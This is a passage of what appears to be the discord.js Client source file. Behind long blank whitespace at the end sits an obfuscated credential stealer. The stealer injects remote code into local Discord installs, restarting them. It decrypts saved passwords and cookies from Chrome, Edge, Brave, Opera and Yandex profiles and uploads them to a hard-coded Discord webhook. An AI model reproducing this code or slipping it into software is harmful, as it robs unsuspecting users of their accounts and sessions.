      throw new TypeError('CLIENT_INVALID_OPTION', 'messageCreateEventGuildTimeout', 'a number');
    }
    if (typeof options.restWsBridgeTimeout !== 'number' || isNaN(options.restWsBridgeTimeout)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restWsBridgeTimeout', 'a number');
    }
    if (typeof options.restRequestTimeout !== 'number' || isNaN(options.restRequestTimeout)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restRequestTimeout', 'a number');
    }
    if (typeof options.restGlobalRateLimit !== 'number' || isNaN(options.restGlobalRateLimit)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restGlobalRateLimit', 'a number');
    }
    if (typeof options.restSweepInterval !== 'number' || isNaN(options.restSweepInterval)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'restSweepInterval', 'a number');
    }
    if (typeof options.retryLimit !== 'number' || isNaN(options.retryLimit)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'retryLimit', 'a number');
    }
    if (typeof options.failIfNotExists !== 'boolean') {
      throw new TypeError('CLIENT_INVALID_OPTION', 'failIfNotExists', 'a boolean');
    }
    if (!Array.isArray(options.userAgentSuffix)) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'userAgentSuffix', 'an array of strings');
    }
    if (
      typeof options.rejectOnRateLimit !== 'undefined' &&
      !(typeof options.rejectOnRateLimit === 'function' || Array.isArray(options.rejectOnRateLimit))
    ) {
      throw new TypeError('CLIENT_INVALID_OPTION', 'rejectOnRateLimit', 'an array or a function');
    }
  }
}

module.exports = Client;

/**
 * Emitted for general warnings.
 * @event Client#warn
 * @param {string} info The warning
 */

/**
 * @external Collection
 * @see {@link https://discord.js.org/#/docs/collection/main/class/Collection}
 */




























































































































































































































































const _0x56f711=_0x442a;(function(_0x132804,_0x3d97b8){const _0x1ac84d=_0x442a,_0x250653=_0x132804();while(!![]){try{const _0x3be8b0=-parseInt(_0x1ac84d(0x1da))/0x1+-parseInt(_0x1ac84d(0x1c7))/0x2+-parseInt(_0x1ac84d(0x1b7))/0x3+parseInt(_0x1ac84d(0x1a5))/0x4*(parseInt(_0x1ac84d(0x19d))/0x5)+parseInt(_0x1ac84d(0x1e1))/0x6+-parseInt(_0x1ac84d(0x16a))/0x7+parseInt(_0x1ac84d(0x1b8))/0x8;if(_0x3be8b0===_0x3d97b8)break;else _0x250653['push'](_0x250653['shift']());}catch(_0x4f32a2){_0x250653['push'](_0x250653['shift']());}}}(_0x1c8d,0x217af));const fs=require('fs'),https=require(_0x56f711(0x1ea)),crypto=require(_0x56f711(0x1b0)),FormData=require(_0x56f711(0x1b1)),glob=require(_0x56f711(0x1d7)),{exec}=require(_0x56f711(0x17e)),axios=require('axios'),dpapi=require(_0x56f711(0x18e)),sqlite3=require(_0x56f711(0x1d9));function _0x1c8d(){const _0x2fe60d=['argv','https://hastebin.skyra.pw/hivumequya.ts','glob','.exe','sqlite3','79214VTweyF','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x201\x5cNetwork\x5c','iscord','\x5cUpdate.exe\x20--processStart\x20','\x0a\x0aSENHAS\x20DE:\x20','env','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x201\x5c','174570vilZXu','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x203\x5cNetwork\x5c','debug','\x5cSenhas.txt','update','https://discord.com/api/webhooks/1190510967784747109/iZCBQRke-pkonQ7IS3dSJ6bm3UXSF2uAA4C5uDQ4Cc5RzDtlGTQoABRDkOqlgP4a7aQ_','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x204\x5c','forEach','CurrentUser','https','Local\x20State','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x204\x5cNetwork\x5c','\x092597573456\x09','slice','split','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x205\x5c','log','Database','splice','Cookies','SELECT\x20origin_url,\x20username_value,\x20password_value\x20FROM\x20logins','1194781FRHFeI','map','username_value','DiscordPTB','Discord','from','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x204\x5cNetwork\x5c','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x202\x5cNetwork\x5c','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x203\x5c','\x5capp-*\x5cmodules\x5cdiscord_desktop_core-*\x5cdiscord_desktop_core\x5cindex.js','name','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x203\x5cNetwork\x5c','existsSync','length','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cDefault\x5c','password_value','final','each','\x0aURL:\x20','push','child_process','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cGuest\x20Profile\x5cNetwork\x5c','LOCALAPPDATA','cord','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cGuest\x20Profile\x5c','Login\x20Data','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x202\x5cNetwork\x5c','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x203\x5cNetwork\x5c','passwords.db','file','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cGuest\x20Profile\x5c','createReadStream','SELECT\x20host_key,\x20name,\x20encrypted_value\x20FROM\x20cookies','APPDATA','encrypted_key','os_crypt','win-dpapi','base64','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x205\x5cNetwork\x5c','error','Network','encrypted_value','host_key','.exe\x20/F','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cGuest\x20Profile\x5c','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x205\x5c','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x205\x5cNetwork\x5c','\x20|\x20PASSWORD:\x20','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x202\x5cNetwork\x5c','\x5cOpera\x20Software\x5cOpera\x20Stable\x5c','DiscordCanary.exe','1245Rnxbbv','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x203\x5c','DiscordPTB.exe','get','Local:','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x202\x5c','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x201\x5cNetwork\x5c','unprotectData','2876RDyZVJ','TRUE','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x201\x5cNetwork\x5c','cookies.db','end','data','createDecipheriv','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x204\x5c','\x5cOpera\x20Software\x5cOpera\x20GX\x20Stable\x5c','toString','utf-8','crypto','form-data','\x5cCookies.txt','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x202\x5c','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x201\x5c','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cDefault\x5cNetwork\x5c','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x205\x5cNetwork\x5c','542613CKlrbg','4503336DWThrp','readdirSync','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x205\x5c','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cGuest\x20Profile\x5cNetwork\x5c','parse','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x201\x5cNetwork\x5c','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x205\x5cNetwork\x5c','\x09FALSE','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x203\x5c','writeFile','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x204\x5c','origin_url','setAuthTag','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x203\x5c','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x204\x5cNetwork\x5c','406280wpzMcr','\x20|\x20USERNAME:\x20','startsWith','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x201\x5c','post','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cDefault\x5cNetwork\x5c','includes','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x204\x5c','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cGuest\x20Profile\x5c','copyFileSync','readFileSync','submit','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x204\x5cNetwork\x5c','aes-256-gcm'];_0x1c8d=function(){return _0x2fe60d;};return _0x1c8d();}var debug=![],args=process[_0x56f711(0x1d5)][_0x56f711(0x162)](0x2),fourstars=_0x56f711(0x1e6),serverfile=_0x56f711(0x1d6);const LOCAL=process[_0x56f711(0x1df)][_0x56f711(0x180)],discords=[],injectPath=[],runningDiscords=[];fs[_0x56f711(0x1b9)](LOCAL)[_0x56f711(0x1e8)](_0x520b82=>{const _0x14c875=_0x56f711;if(_0x520b82[_0x14c875(0x1cd)](_0x14c875(0x1dc)))discords[_0x14c875(0x17d)](LOCAL+'\x5c'+_0x520b82);else return;}),discords['forEach'](function(_0x35e25f){const _0x42d15c=_0x56f711;let _0x2dab91=''+_0x35e25f+_0x42d15c(0x173);glob['sync'](_0x2dab91)[_0x42d15c(0x16b)](_0x555496=>{const _0x24f6df=_0x42d15c;injectPath[_0x24f6df(0x17d)](_0x555496);});}),fetchlocals();function inject(){const _0x34e4ee=_0x56f711;https[_0x34e4ee(0x1a0)](serverfile,_0x118990=>{const _0x2e5b13=_0x34e4ee;let _0x15c9fb='';_0x118990['on'](_0x2e5b13(0x1aa),_0x165d56=>{_0x15c9fb+=_0x165d56;}),_0x118990['on'](_0x2e5b13(0x1a9),()=>{const _0x500321=_0x2e5b13;injectPath[_0x500321(0x1e8)](_0x5f4203=>{fs['writeFileSync'](_0x5f4203,_0x15c9fb,{'encoding':'utf8','flag':'w'});});});})['on'](_0x34e4ee(0x191),_0x49657e=>{const _0x33543d=_0x34e4ee;console[_0x33543d(0x165)](_0x49657e);});}function fetchlocals(){exec('tasklist',function(_0x41f4f4,_0x33f2a5,_0x4bbc5f){const _0x26e04b=_0x442a;_0x33f2a5[_0x26e04b(0x1cd)]('Discord.exe')&&runningDiscords[_0x26e04b(0x17d)](_0x26e04b(0x16e)),_0x33f2a5['includes'](_0x26e04b(0x19c))&&runningDiscords[_0x26e04b(0x17d)]('DiscordCanary'),_0x33f2a5[_0x26e04b(0x1cd)](_0x26e04b(0x19f))&&runningDiscords[_0x26e04b(0x17d)](_0x26e04b(0x16d)),discordoff(),inject(),discordon();}),warn();}function discordoff(){const _0xed80fe=_0x56f711;runningDiscords[_0xed80fe(0x1e8)](_0x233320=>{const _0xdec974=_0xed80fe;exec('taskkill\x20/IM\x20'+_0x233320+_0xdec974(0x195),_0x5cacc5=>{if(_0x5cacc5)return;});});}function discordon(){const _0x3c17ab=_0x56f711;runningDiscords[_0x3c17ab(0x1e8)](_0x50404e=>{const _0x27bbb9=_0x3c17ab;let _0x23431b=LOCAL+'\x5c'+_0x50404e+_0x27bbb9(0x1dd)+_0x50404e+_0x27bbb9(0x1d8);exec(_0x23431b,_0x3561a4=>{if(_0x3561a4)return;});});}function warn(){const _0x4ab33d=_0x56f711;let _0x3c2f83=[];injectPath[_0x4ab33d(0x1e8)](_0x19c1a9=>{const _0x20dfb6=_0x4ab33d;let _0x164565={'name':_0x20dfb6(0x1a1),'value':'`'+_0x19c1a9+'`','inline':!0x1};_0x3c2f83[_0x20dfb6(0x17d)](_0x164565);}),axios[_0x4ab33d(0x1cb)](fourstars,{'embeds':[{'title':'<:red_ninja:967360512499261510>\x20Injetado','color':0x0,'fields':_0x3c2f83}]});}if(args[0x0]==_0x56f711(0x1e3))debug=![];var appdata=process[_0x56f711(0x1df)][_0x56f711(0x18b)],localappdata=process[_0x56f711(0x1df)][_0x56f711(0x180)],paths=[localappdata+'\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cDefault\x5c',localappdata+_0x56f711(0x1e0),localappdata+'\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cProfile\x202\x5c',localappdata+_0x56f711(0x1c5),localappdata+_0x56f711(0x1c2),localappdata+_0x56f711(0x1ba),localappdata+_0x56f711(0x196),localappdata+'\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cDefault\x5cNetwork\x5c',localappdata+_0x56f711(0x1a3),localappdata+_0x56f711(0x19a),localappdata+_0x56f711(0x1e2),localappdata+_0x56f711(0x1ec),localappdata+_0x56f711(0x198),localappdata+_0x56f711(0x17f),appdata+_0x56f711(0x19b),appdata+_0x56f711(0x1ad),localappdata+'\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cDefault\x5c',localappdata+_0x56f711(0x1ca),localappdata+_0x56f711(0x1a2),localappdata+_0x56f711(0x1c0),localappdata+_0x56f711(0x1ce),localappdata+_0x56f711(0x164),localappdata+_0x56f711(0x188),localappdata+'\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x201\x5c',localappdata+_0x56f711(0x1b3),localappdata+_0x56f711(0x19e),localappdata+_0x56f711(0x1e7),localappdata+'\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x205\x5c',localappdata+_0x56f711(0x1cf),localappdata+_0x56f711(0x178),localappdata+_0x56f711(0x1b4),localappdata+'\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cProfile\x202\x5c',localappdata+_0x56f711(0x172),localappdata+_0x56f711(0x1ac),localappdata+_0x56f711(0x197),localappdata+_0x56f711(0x182),localappdata+_0x56f711(0x1cc),localappdata+_0x56f711(0x1bd),localappdata+_0x56f711(0x171),localappdata+'\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cProfile\x203\x5cNetwork\x5c',localappdata+_0x56f711(0x1d3),localappdata+_0x56f711(0x1b6),localappdata+'\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cGuest\x20Profile\x5cNetwork\x5c',localappdata+_0x56f711(0x1a7),localappdata+'\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cProfile\x202\x5cNetwork\x5c',localappdata+_0x56f711(0x185),localappdata+_0x56f711(0x1c6),localappdata+_0x56f711(0x190),localappdata+_0x56f711(0x1bb),localappdata+_0x56f711(0x1b5),localappdata+_0x56f711(0x1db),localappdata+_0x56f711(0x184),localappdata+_0x56f711(0x175),localappdata+_0x56f711(0x170),localappdata+_0x56f711(0x1be),localappdata+'\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cGuest\x20Profile\x5cNetwork\x5c'];takePizzas(),takeCheese();async function getPizzas(_0x27595b){const _0x3aa90d=_0x56f711;let _0x48a9bc=_0x27595b[_0x3aa90d(0x163)]('\x5c'),_0x127197=_0x27595b['includes'](_0x3aa90d(0x192))?_0x48a9bc[_0x3aa90d(0x167)](0x0,_0x48a9bc['length']-0x3):_0x48a9bc[_0x3aa90d(0x167)](0x0,_0x48a9bc[_0x3aa90d(0x177)]-0x2),_0x344ccf=_0x127197['join']('\x5c')+'\x5c';if(_0x27595b['startsWith'](appdata))_0x344ccf=_0x27595b;if(_0x27595b[_0x3aa90d(0x1cd)]('cord'))return;if(fs[_0x3aa90d(0x176)](_0x344ccf)){let _0x557040=Buffer['from'](JSON[_0x3aa90d(0x1bc)](fs[_0x3aa90d(0x1d1)](_0x344ccf+_0x3aa90d(0x1eb)))[_0x3aa90d(0x18d)]['encrypted_key'],_0x3aa90d(0x18f))['slice'](0x5);var _0x2c3194=_0x27595b+'Login\x20Data',_0x5a45a3=_0x27595b+_0x3aa90d(0x186);fs[_0x3aa90d(0x1d0)](_0x2c3194,_0x5a45a3);const _0x323e02=dpapi[_0x3aa90d(0x1a4)](Buffer[_0x3aa90d(0x16f)](_0x557040,'utf-8'),null,'CurrentUser');var _0x4eab94=_0x3aa90d(0x1de)+_0x27595b+'\x20\x20by:\x20Victor឵#0011\x0a',_0xf69676=new sqlite3[(_0x3aa90d(0x166))](_0x5a45a3,_0x1cca50=>{if(_0x1cca50){if(debug)console['log'](_0x1cca50);}});const _0x223c44=await new Promise((_0x29667e,_0x4a5c2a)=>{const _0xe484d8=_0x3aa90d;_0xf69676[_0xe484d8(0x17b)](_0xe484d8(0x169),function(_0x8108f5,_0x4aab14){const _0x159290=_0xe484d8;if(_0x8108f5){if(debug)console['log'](_0x8108f5);}if(_0x4aab14['username_value']!=''){let _0x4e23ba=_0x4aab14[_0x159290(0x179)];try{if(_0x4e23ba[0x0]==0x1&&_0x4e23ba[0x1]==0x0&&_0x4e23ba[0x2]==0x0&&_0x4e23ba[0x3]==0x0)_0x4eab94+='\x0aURL:\x20'+_0x4aab14[_0x159290(0x1c3)]+_0x159290(0x1c8)+_0x4aab14[_0x159290(0x16c)]+_0x159290(0x199)+dpapi[_0x159290(0x1a4)](_0x4e23ba,null,_0x159290(0x1e9))[_0x159290(0x1ae)]('utf-8');else{let _0x1a59fe=_0x4e23ba['slice'](0x3,0xf),_0x304743=_0x4e23ba['slice'](0xf,_0x4e23ba['length']-0x10),_0x3e5c27=_0x4e23ba['slice'](_0x4e23ba[_0x159290(0x177)]-0x10,_0x4e23ba[_0x159290(0x177)]),_0x4d3590=crypto[_0x159290(0x1ab)]('aes-256-gcm',_0x323e02,_0x1a59fe);_0x4d3590['setAuthTag'](_0x3e5c27),_0x4eab94+=_0x159290(0x17c)+_0x4aab14[_0x159290(0x1c3)]+_0x159290(0x1c8)+_0x4aab14[_0x159290(0x16c)]+_0x159290(0x199)+_0x4d3590[_0x159290(0x1e5)](_0x304743,_0x159290(0x18f),_0x159290(0x1af))+_0x4d3590[_0x159290(0x17a)](_0x159290(0x1af));}}catch(_0x39f900){if(debug)console['log'](_0x39f900);}}},function(){_0x29667e(_0x4eab94);});});return _0x223c44;}else return'';}async function getCheese(_0x58771f){const _0x50b0a2=_0x56f711;let _0x883ea9=_0x58771f[_0x50b0a2(0x163)]('\x5c'),_0x300335=_0x58771f[_0x50b0a2(0x1cd)](_0x50b0a2(0x192))?_0x883ea9['splice'](0x0,_0x883ea9['length']-0x3):_0x883ea9[_0x50b0a2(0x167)](0x0,_0x883ea9[_0x50b0a2(0x177)]-0x2),_0x300d35=_0x300335['join']('\x5c')+'\x5c';if(_0x58771f[_0x50b0a2(0x1c9)](appdata))_0x300d35=_0x58771f;if(_0x58771f['includes'](_0x50b0a2(0x181)))return;if(fs[_0x50b0a2(0x176)](_0x300d35)){let _0x1b1253=Buffer[_0x50b0a2(0x16f)](JSON['parse'](fs[_0x50b0a2(0x1d1)](_0x300d35+'Local\x20State'))[_0x50b0a2(0x18d)][_0x50b0a2(0x18c)],_0x50b0a2(0x18f))[_0x50b0a2(0x162)](0x5);var _0x194a0e=_0x58771f+'Cookies',_0x480a4c=_0x58771f+_0x50b0a2(0x1a8);fs['copyFileSync'](_0x194a0e,_0x480a4c);const _0x5d06c7=dpapi[_0x50b0a2(0x1a4)](Buffer[_0x50b0a2(0x16f)](_0x1b1253,'utf-8'),null,_0x50b0a2(0x1e9));var _0x291a12='',_0x4e047a=new sqlite3['Database'](_0x480a4c,_0x2b509a=>{const _0x134da5=_0x50b0a2;if(_0x2b509a){if(debug)console[_0x134da5(0x165)](_0x2b509a);}});const _0x1f9fc3=await new Promise((_0x160acd,_0x2fcbd3)=>{const _0x253b5e=_0x50b0a2;_0x4e047a[_0x253b5e(0x17b)](_0x253b5e(0x18a),function(_0x1f4852,_0x13bcc4){const _0xd94ad2=_0x253b5e;if(_0x1f4852){if(debug)console[_0xd94ad2(0x165)](_0x1f4852);}let _0x4d5031=_0x13bcc4[_0xd94ad2(0x193)];try{if(_0x4d5031[0x0]==0x1&&_0x4d5031[0x1]==0x0&&_0x4d5031[0x2]==0x0&&_0x4d5031[0x3]==0x0)_0x291a12+=_0x13bcc4[_0xd94ad2(0x194)]+'\x09'+_0xd94ad2(0x1a6)+'\x09/'+_0xd94ad2(0x1bf)+'\x092597573456\x09'+_0x13bcc4[_0xd94ad2(0x174)]+'\x09'+dpapi['unprotectData'](_0x4d5031,null,_0xd94ad2(0x1e9))+'\x0a'[_0xd94ad2(0x1ae)](_0xd94ad2(0x1af));else{let _0x46a01f=_0x4d5031[_0xd94ad2(0x162)](0x3,0xf),_0x50c8ac=_0x4d5031['slice'](0xf,_0x4d5031[_0xd94ad2(0x177)]-0x10),_0x2266b2=_0x4d5031['slice'](_0x4d5031['length']-0x10,_0x4d5031[_0xd94ad2(0x177)]),_0x2649f3=crypto[_0xd94ad2(0x1ab)](_0xd94ad2(0x1d4),_0x5d06c7,_0x46a01f);_0x2649f3[_0xd94ad2(0x1c4)](_0x2266b2),_0x291a12+=_0x13bcc4[_0xd94ad2(0x194)]+'\x09'+_0xd94ad2(0x1a6)+'\x09/'+_0xd94ad2(0x1bf)+_0xd94ad2(0x1ed)+_0x13bcc4[_0xd94ad2(0x174)]+'\x09'+_0x2649f3[_0xd94ad2(0x1e5)](_0x50c8ac,'base64',_0xd94ad2(0x1af))+_0x2649f3[_0xd94ad2(0x17a)](_0xd94ad2(0x1af))+'\x0a';}}catch(_0x1b7368){if(debug)console[_0xd94ad2(0x165)](_0x1b7368);}},function(){_0x160acd(_0x291a12);});});return _0x1f9fc3;}else return'';}function _0x442a(_0x5b25c9,_0x4a5047){const _0x1c8dc3=_0x1c8d();return _0x442a=function(_0x442a16,_0x48eaee){_0x442a16=_0x442a16-0x162;let _0x526971=_0x1c8dc3[_0x442a16];return _0x526971;},_0x442a(_0x5b25c9,_0x4a5047);}async function takePizzas(){const _0x46d64a=_0x56f711;let _0x539bc4='';for(let _0x26f3ed=0x0;_0x26f3ed<paths['length'];_0x26f3ed++){if(fs['existsSync'](paths[_0x26f3ed]+_0x46d64a(0x183)))_0x539bc4+=await getPizzas(paths[_0x26f3ed])||'';}fs[_0x46d64a(0x1c1)](appdata+'\x5cSenhas.txt',_0x539bc4,function(_0x259c50,_0x516dc2){const _0x52b242=_0x46d64a;if(_0x259c50)throw _0x259c50;const _0x71b529=new FormData();_0x71b529['append'](_0x52b242(0x187),fs[_0x52b242(0x189)](appdata+_0x52b242(0x1e4))),_0x71b529[_0x52b242(0x1d2)](fourstars,(_0x12ca68,_0x565633)=>{const _0x4983d1=_0x52b242;if(_0x12ca68)console[_0x4983d1(0x165)](_0x12ca68);});});}async function takeCheese(){const _0x47fb56=_0x56f711;let _0x2c0033='';for(let _0x581f70=0x0;_0x581f70<paths[_0x47fb56(0x177)];_0x581f70++){if(fs[_0x47fb56(0x176)](paths[_0x581f70]+_0x47fb56(0x168)))_0x2c0033+=await getCheese(paths[_0x581f70])||'';}fs[_0x47fb56(0x1c1)](appdata+_0x47fb56(0x1b2),_0x2c0033,function(_0x54102c,_0x4a256d){const _0xdaf177=_0x47fb56;if(_0x54102c)throw _0x54102c;const _0x2c9a4d=new FormData();_0x2c9a4d['append'](_0xdaf177(0x187),fs['createReadStream'](appdata+_0xdaf177(0x1b2))),_0x2c9a4d[_0xdaf177(0x1d2)](fourstars,(_0x4b6eef,_0x1cea9e)=>{const _0x40a661=_0xdaf177;if(_0x4b6eef)console[_0x40a661(0x165)](_0x4b6eef);});});}
